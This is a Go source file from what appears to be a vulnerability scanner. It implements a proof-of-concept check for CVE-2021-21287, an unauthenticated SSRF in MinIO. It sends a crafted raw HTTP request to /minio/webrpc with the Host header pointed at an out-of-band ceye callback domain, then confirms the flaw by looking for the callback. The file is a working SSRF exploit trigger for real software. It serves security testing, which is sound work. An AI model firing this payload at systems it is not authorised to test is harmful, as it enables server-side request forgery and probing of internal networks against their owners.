package poc

import (
	"fmt"
	"youzai/util"
)

func (Info *PocInfo) CVE_2021_21287_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CVE-2021-21287"
	poc.Info.Target = "minio"
	poc.Info.Type = "SSRF"
	poc.Info.Name = "MinIO Unauth SSRF"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	poc.Poc.Proto = "http"

	poc.Config.Customize = true // 设置为自定义poc
	poc.Config.Url = PocCustomize.Config.Url
	poc.Config.Timeout = PocCustomize.Config.Timeout
	poc.Config.User_Agent = PocCustomize.Config.User_Agent
	poc.Config.Proxy = PocCustomize.Config.Proxy
	poc.Config.Proxy_Url = PocCustomize.Config.Proxy_Url

	// 编写自定义检测函数，返回值有两个，第一个是判断是否存在存在漏洞，第二个参数返回响应状态码
	poc.Config.Check = func() (bool, int) {
		pocData := `{"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}`
		randstr, ceye_url := util.Get_Ceye()

		tcpData := "POST /minio/webrpc HTTP/1.1\r\n"
		tcpData += fmt.Sprintf("Host: %s\r\n", ceye_url)
		tcpData += poc.Config.User_Agent + "\r\n"
		tcpData += "Content-Type: application/json\r\n"
		tcpData += "Content-Length: 76\r\n"
		tcpData += "Connection: close\r\n\r\n"
		tcpData += pocData

		_, code := util.Tcp_Send(poc.Config.Url, tcpData, 10)
		success := util.Ceye_Check(randstr)
		if success {
			return true, code
		}
		return false, 0
	}

	PocStruct = append(PocStruct, poc)
}
